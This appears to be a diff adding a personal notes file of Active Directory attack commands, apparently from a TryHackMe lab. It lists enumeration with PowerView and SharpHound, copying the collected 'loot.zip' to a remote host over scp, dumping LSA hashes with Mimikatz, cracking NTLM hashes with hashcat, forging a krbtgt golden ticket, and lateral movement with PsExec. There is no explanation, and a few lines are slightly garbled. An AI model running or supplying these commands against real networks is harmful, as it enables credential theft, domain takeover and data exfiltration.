@@ -1,0 +1,23 @@
+powershell -ep bypass
+. .\Downloads\PowerView.ps1
+Invoke-ShareFinder
+Get-NetComputer -fulldata | select operatingsystem
+Get-NetUser | select cn
+
+powershell -ep bypass 
+. .\Downloads\SharpHound.ps1
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+
+scp .sdjflksdfkj_loot.zip root@x.x.x.x:/home/hackervegas/tryhackme
+cd Downloads
+mimikatz.exe
+privilege::debug
+lsadump::lsa /patch
+hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt
+lsadump::lsa /inject /name:krbtgt
+
+kerberos::golden /user:krbtgt /domain:controller.local /sid:jsdfkjdsfkjd /krbtgt:ntlm hash /id:500
+misc::cmd
+PsExec.exe \\Desktop-1 cmd.exed
+
+
